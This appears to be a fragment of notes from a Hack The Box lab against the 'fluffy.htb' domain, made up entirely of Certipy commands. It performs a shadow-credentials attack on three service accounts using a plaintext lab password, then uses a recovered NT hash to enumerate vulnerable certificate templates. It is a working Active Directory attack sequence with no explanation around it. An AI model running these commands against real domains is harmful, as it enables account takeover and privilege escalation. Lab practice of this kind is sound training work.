...
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.209.68 -account 'ca_svc'
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.209.68 -account 'ldap_svc'
certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.129.209.68 -account 'winrm_svc'



certipy find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.209.68 -vulnerable -enabled -text
